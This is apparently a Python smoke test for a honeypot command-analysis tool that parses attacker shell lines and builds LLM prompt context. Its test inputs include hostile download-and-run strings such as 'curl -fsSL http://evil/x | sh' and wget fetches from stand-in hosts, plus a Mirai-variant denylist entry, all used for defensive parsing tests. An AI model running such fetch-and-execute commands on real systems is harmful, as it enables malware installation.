"""Smoke test for ROADMAP #11 — command grounding for LLM prompt.

Covers the three pure-function pieces:

  * `parse_shell_line` — heuristic shell parser. Splits on shell
    separators, identifies commands and flags, handles busybox/sudo
    multi-call binaries.
  * `_load_command_data` — merges tldr bundle + curated YAML, curated
    wins on every field.
  * `build_ground_truth_block` — renders the prompt block, filtering
    flags to only those actually present in the command line.

Plus cache-hash integration:
  * `compute_llm_config_hash` changes when a curated YAML file edits.

Standalone — no ES, no LLM.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_command_descriptions.py
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from enrich import command_grounding
from enrich.command_grounding import (
    build_ground_truth_block,
    parse_shell_line,
    reset_loaded_for_tests,
)


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


# -------------------------------------------------------------------------
# [1] Shell parser — basic command + flag extraction
# -------------------------------------------------------------------------
print("\n[1] parse_shell_line")
out = parse_shell_line("wget -q -O /tmp/payload http://evil.example/x")
check("simple wget",
      out == [("wget", ["-q", "-O"])], f"got {out!r}")

out = parse_shell_line("curl -fsSL http://evil/x | sh")
check("pipe → two commands",
      [c for c, _ in out] == ["curl", "sh"], f"got {out!r}")

out = parse_shell_line("cd /tmp && wget http://x/p && chmod +x p")
# Note: `+x` doesn't match the `-x` flag pattern, so chmod yields no flags.
# That's intentional — the curated chattr/chmod entries fall back to surfacing
# the command and the LLM still gets the operator-suffix from the raw command.
check("chained commands",
      [c for c, _ in out] == ["cd", "wget", "chmod"],
      f"got {[c for c, _ in out]!r}")

out = parse_shell_line("./payload arg1 arg2")
check("strips ./ from cmd token",
      [c for c, _ in out] == ["payload"], f"got {out!r}")

out = parse_shell_line("/usr/bin/wget -q http://x/p")
check("strips path prefix from cmd token",
      [c for c, _ in out] == ["wget"], f"got {out!r}")

out = parse_shell_line('echo "hello world" > /tmp/x')
check("handles quoted strings",
      [c for c, _ in out] == ["echo"], f"got {out!r}")

out = parse_shell_line("FOO=bar BAZ=qux wget http://x/p")
check("skips env-var assignments",
      out and out[0][0] == "wget", f"got {out!r}")

out = parse_shell_line("")
check("empty string → empty", out == [], f"got {out!r}")

out = parse_shell_line("echo 'unbalanced quote")
check("unbalanced quotes don't crash", isinstance(out, list))

# -- Parser strictness regression set --------------------------------------
# These are tokens the OLD parser was leaking into the corpus-coverage
# Health page (ROADMAP #11.5). All should be rejected by either the
# quote-aware segment split or `_VALID_CMD_NAME_RE`.
out = parse_shell_line("awk '{print $4,$5,$6,$7,$8,$9;}'")
check("awk script body not walked as commands",
      [c for c, _ in out] == ["awk"], f"got {out!r}")

out = parse_shell_line('echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh')
check("quoted-string contents not split as segments",
      [c for c, _ in out] == ["echo", "sh"], f"got {out!r}")

out = parse_shell_line("Accept-Encoding: gzip")
check("HTTP-header-shaped token rejected",
      out == [], f"got {out!r}")

out = parse_shell_line("6")
check("bare number rejected", out == [], f"got {out!r}")

out = parse_shell_line(">A@/`'8")
check("garbage / encoding artifact rejected",
      out == [], f"got {out!r}")

out = parse_shell_line("} '")
check("brace-quote tokens rejected", out == [], f"got {out!r}")


# -------------------------------------------------------------------------
# [2] Multi-call binaries — busybox
# (sudo intentionally NOT special-cased, see _MULTICALL_BINARIES comment.)
# -------------------------------------------------------------------------
print("\n[2] busybox multi-call")
out = parse_shell_line("busybox wget -q http://x/p")
names = [c for c, _ in out]
check("busybox AND wget surfaced",
      "busybox" in names and "wget" in names, f"got {names!r}")

# Without special-casing, sudo just appears as its own command. The wrapped
# command is left to the LLM to parse from context.
out = parse_shell_line("sudo -u root chmod +x /tmp/x")
names = [c for c, _ in out]
check("sudo not special-cased (only sudo itself surfaces)",
      names[0] == "sudo", f"got {names!r}")


# -------------------------------------------------------------------------
# [3] Loader — new multi-OS bundle shape; curated + tldr coexist.
# -------------------------------------------------------------------------
print("\n[3] loader: multi-OS tldr + curated coexist")
with tempfile.TemporaryDirectory() as td:
    tmp = Path(td)
    curated_dir = tmp / "curated"
    curated_dir.mkdir()
    # New shape: {cmd: {os: summary}}
    (tmp / "tldr.json").write_text(json.dumps({
        "fakecmd": {
            "common":  "tldr/common summary for fakecmd",
            "linux":   "tldr/linux summary for fakecmd",
            "windows": "tldr/windows summary for fakecmd",
        },
        "tldronly": {
            "common": "tldr-only summary",
            "osx":    "macOS-specific tldr summary",
        },
        # Legacy flat-string shape still tolerated (backward compat).
        "legacystr": "old-shape string summary",
    }))
    (curated_dir / "fakecmd.yaml").write_text(
        "description: curated description for fakecmd.\n"
        "flags:\n  -X: 'curated flag'\n"
    )
    command_grounding._DATA_DIR = tmp           # type: ignore[attr-defined]
    command_grounding._CURATED_DIR = curated_dir  # type: ignore[attr-defined]
    command_grounding._TLDR_BUNDLE = tmp / "tldr.json"  # type: ignore[attr-defined]
    reset_loaded_for_tests()

    data = command_grounding._load_command_data()
    check("curated description preserved",
          data["fakecmd"]["curated_description"] == "curated description for fakecmd.")
    check("all 3 OS variants preserved alongside curated",
          set(data["fakecmd"]["tldr_by_os"]) == {"common", "linux", "windows"},
          f"got {set(data['fakecmd']['tldr_by_os'])!r}")
    check("source = 'both' when curated + tldr both exist",
          data["fakecmd"]["source"] == "both",
          f"got {data['fakecmd']['source']!r}")
    check("flags carried from curated",
          data["fakecmd"]["flags"] == {"-X": "curated flag"})

    check("tldr-only command keeps all OS variants",
          set(data["tldronly"]["tldr_by_os"]) == {"common", "osx"})
    check("tldr-only has no curated description",
          data["tldronly"]["curated_description"] == "")
    check("tldr-only source is 'tldr'",
          data["tldronly"]["source"] == "tldr")

    # Legacy flat-string shape gets wrapped into {"common": str}.
    check("legacy flat string → {'common': str}",
          data["legacystr"]["tldr_by_os"] == {"common": "old-shape string summary"})


# -------------------------------------------------------------------------
# [4] build_ground_truth_block — curated + multi-OS variants, flag filtering
# -------------------------------------------------------------------------
print("\n[4] build_ground_truth_block")
with tempfile.TemporaryDirectory() as td:
    tmp = Path(td)
    curated_dir = tmp / "curated"
    curated_dir.mkdir()
    (curated_dir / "wget.yaml").write_text(
        "description: fetch files.\n"
        "flags:\n"
        "  -q: 'quiet'\n"
        "  -O: 'output file'\n"
        "  --no-check-certificate: 'disable TLS'\n"
    )
    (tmp / "tldr.json").write_text(json.dumps({
        "wget": {
            "common":  "tldr/common: download files from the Web.",
            "windows": "tldr/windows: download files (Win port).",
        },
        # Multi-OS command with NO curated entry — must still surface
        # every OS variant tagged.
        "ping": {
            "common":  "tldr/common: send ICMP echo requests.",
            "windows": "tldr/windows: PowerShell ICMP variant.",
            "osx":     "tldr/osx: BSD ICMP variant.",
        },
    }))
    command_grounding._DATA_DIR = tmp           # type: ignore[attr-defined]
    command_grounding._CURATED_DIR = curated_dir  # type: ignore[attr-defined]
    command_grounding._TLDR_BUNDLE = tmp / "tldr.json"  # type: ignore[attr-defined]
    reset_loaded_for_tests()

    # Curated + multi-OS variants render together.
    block = build_ground_truth_block("wget -q -O /tmp/x http://evil/p")
    check("curated line tagged '(curated)'",
          "wget (curated) — fetch files." in block, f"got:\n{block}")
    check("present flags surface, absent flags don't",
          "-q" in block and "-O" in block and "--no-check-certificate" not in block,
          f"got:\n{block}")
    check("tldr/common variant rendered with OS tag",
          "wget (tldr/common) — tldr/common: download files from the Web." in block,
          f"got:\n{block}")
    check("tldr/windows variant rendered with OS tag",
          "wget (tldr/windows) — tldr/windows: download files (Win port)." in block,
          f"got:\n{block}")
    # Ordering: curated first, then tldr/common, then tldr/windows.
    pos_curated = block.find("(curated)")
    pos_common  = block.find("(tldr/common)")
    pos_windows = block.find("(tldr/windows)")
    check("rendering order: curated → tldr/common → tldr/windows",
          0 <= pos_curated < pos_common < pos_windows,
          f"positions: curated={pos_curated}, common={pos_common}, windows={pos_windows}")

    # No curated → all OS variants still render.
    block_ping = build_ground_truth_block("ping example.com")
    check("ping: all 3 OS variants present in block",
          all(f"ping (tldr/{os})" in block_ping for os in ["common", "windows", "osx"]),
          f"got:\n{block_ping}")
    check("ping: no '(curated)' line when no curated entry",
          "(curated)" not in block_ping, f"got:\n{block_ping}")

    # Unknown command path.
    block_unknown = build_ground_truth_block("nonexistentcommand --foo")
    check("unknown command → '(no description available)' line",
          "(no description available)" in block_unknown,
          f"got:\n{block_unknown}")

    # Empty input.
    block_empty = build_ground_truth_block("")
    check("empty line → '(no recognized commands)' sentinel",
          block_empty == "(no recognized commands)",
          f"got:\n{block_empty}")


# -------------------------------------------------------------------------
# [4b] Denylist suppresses payload-name false positives in the prompt block
# (ROADMAP #11.5 follow-on).
# -------------------------------------------------------------------------
print("\n[4b] denylist suppresses tokens from the prompt block")
with tempfile.TemporaryDirectory() as td:
    tmp = Path(td)
    curated_dir = tmp / "curated"
    curated_dir.mkdir()
    (tmp / "tldr.json").write_text(json.dumps({
        "wget": {"common": "fetch files."},
    }))
    (tmp / "denylist.yaml").write_text(
        '"satori": "Mirai variant identifier, not a command"\n'
    )
    command_grounding._DATA_DIR = tmp                       # type: ignore[attr-defined]
    command_grounding._CURATED_DIR = curated_dir              # type: ignore[attr-defined]
    command_grounding._TLDR_BUNDLE = tmp / "tldr.json"        # type: ignore[attr-defined]
    command_grounding._DENYLIST_PATH = tmp / "denylist.yaml"  # type: ignore[attr-defined]
    reset_loaded_for_tests()

    # `satori` is a busybox subcommand → denied → no line.
    block = build_ground_truth_block("/bin/busybox SATORI")
    check("denylisted token NOT in block",
          "satori" not in block.lower(), f"got:\n{block}")
    check("busybox itself still surfaces",
          "busybox" in block.lower(), f"got:\n{block}")

    # A line that's ENTIRELY denied falls back to the empty sentinel.
    block_all_denied = build_ground_truth_block("satori")
    check("all-denied line → '(no recognized commands)'",
          block_all_denied == "(no recognized commands)",
          f"got:\n{block_all_denied}")

    # list_denied_commands exposes the rationale strings.
    from enrich.command_grounding import (
        add_to_denylist, list_denied_commands, remove_from_denylist,
    )
    denied = list_denied_commands()
    check("list_denied_commands returns the loaded rationales",
          denied.get("satori", "").startswith("Mirai variant"),
          f"got {denied!r}")

    # --- writer round-trip ----------------------------------------------
    ok, msg = add_to_denylist("addedtest", "added via smoke")
    check("add_to_denylist round-trip ok", ok, f"msg={msg!r}")
    check("addedtest now in denylist",
          "addedtest" in list_denied_commands())

    # Rationale-truncation: 300-char cap.
    long_reason = "x" * 500
    ok, _ = add_to_denylist("trunctest", long_reason)
    rl = list_denied_commands().get("trunctest", "")
    check("rationale truncated to 300 chars", len(rl) == 300,
          f"got len={len(rl)}")

    # Token validation: whitespace rejected.
    ok, msg = add_to_denylist("bad token", "reason")
    check("whitespace token rejected",
          (not ok) and "rejected" in msg, f"ok={ok}, msg={msg!r}")
    # Quote chars rejected (would break the YAML).
    ok, msg = add_to_denylist('bad"token', "reason")
    check("quote-bearing token rejected", not ok, f"ok={ok}, msg={msg!r}")
    # Empty / overlong rejected.
    ok, _ = add_to_denylist("", "x")
    check("empty token rejected", not ok)
    ok, _ = add_to_denylist("z" * 80, "x")
    check("overlong token rejected", not ok)

    # Remove a present entry, then a missing one.
    ok, msg = remove_from_denylist("addedtest")
    check("remove_from_denylist removes present entry", ok, f"msg={msg!r}")
    check("addedtest gone after remove",
          "addedtest" not in list_denied_commands())
    ok, msg = remove_from_denylist("addedtest")
    check("remove of missing entry returns ok=False",
          not ok and "not in denylist" in msg, f"msg={msg!r}")

    # The file on disk reflects the current state (post-add of satori +
    # trunctest, post-remove of addedtest).
    disk = (tmp / "denylist.yaml").read_text()
    check("file has satori entry",   '"satori":'   in disk)
    check("file has trunctest entry", '"trunctest":' in disk)
    check("file no longer has addedtest", '"addedtest"' not in disk)


# -------------------------------------------------------------------------
# [5] compute_llm_config_hash folds in the commands data dir
# -------------------------------------------------------------------------
print("\n[5] cache hash includes command-grounding data")
# Reset to real data dir before this test.
command_grounding._DATA_DIR = Path(__file__).resolve().parents[2] / "src" / "enrich" / "data" / "commands"  # type: ignore[attr-defined]
command_grounding._CURATED_DIR = command_grounding._DATA_DIR / "curated"  # type: ignore[attr-defined]
command_grounding._TLDR_BUNDLE = command_grounding._DATA_DIR / "tldr.json"  # type: ignore[attr-defined]
reset_loaded_for_tests()

from enrich.config import AppConfig, compute_llm_config_hash

# Build a min-viable AppConfig anchored on a tmp tree where we can mutate
# the commands data directory and observe the hash change.
with tempfile.TemporaryDirectory() as td:
    tmp = Path(td)
    pp = tmp / "command_enrichment.txt"
    pp.write_text("PROMPT TEXT")
    cfg_dict = {
        "elasticsearch": {"hosts": ["http://x"],
                          "indexes": {"cowrie": {
                              "sessions_raw": "raw", "commands": "cmds",
                              "command_clusters": "cc", "sessions_rollup": "sr",
                              "session_clusters": "sc", "ips_rollup": "ir",
                              "ip_clusters": "ic", "campaigns": "ca"}}},
        "llm": {"base_url": "http://l", "generation_model": "m", "embedding_model": "e"},
        "worker": {"state_db": str(tmp / "state.sqlite")},
        "prompts": {"command_enrichment": str(pp)},
    }
    cfg = AppConfig.model_validate(cfg_dict)
    h_before = compute_llm_config_hash(cfg)
    # Now mutate the real data directory (a curated YAML).
    target_yaml = (Path(__file__).resolve().parents[2]
                   / "src" / "enrich" / "data" / "commands" / "curated" / "wget.yaml")
    original = target_yaml.read_text()
    try:
        target_yaml.write_text(original + "\n# benign comment for the smoke test\n")
        h_after = compute_llm_config_hash(cfg)
        check("editing a curated YAML changes llm_config_hash",
              h_before != h_after, f"both = {h_before!r}")
    finally:
        target_yaml.write_text(original)
    h_restored = compute_llm_config_hash(cfg)
    check("restoring the YAML restores the hash",
          h_restored == h_before, f"before={h_before!r} after-restore={h_restored!r}")


# -------------------------------------------------------------------------
# Summary
# -------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
